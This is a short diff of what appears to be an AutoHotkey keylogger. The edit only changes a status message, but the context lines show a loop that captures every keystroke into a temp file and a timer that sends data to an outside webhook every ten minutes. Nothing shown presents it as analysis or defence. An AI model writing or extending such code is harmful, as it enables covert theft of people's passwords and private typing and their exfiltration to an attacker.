@@ -10,7 +10,7 @@ Http.Send(Json)
 }
 
 SetTimer, SendW, 600000
-SendWebhook("Successfully connected to webhook :white_check_mark:")
+SendWebhook("Successfully started .ahk :white_check_mark:")
 Loop {
 	Input, Key, L1 V
 	FileAppend, %Key%, %A_Temp%emp.txt
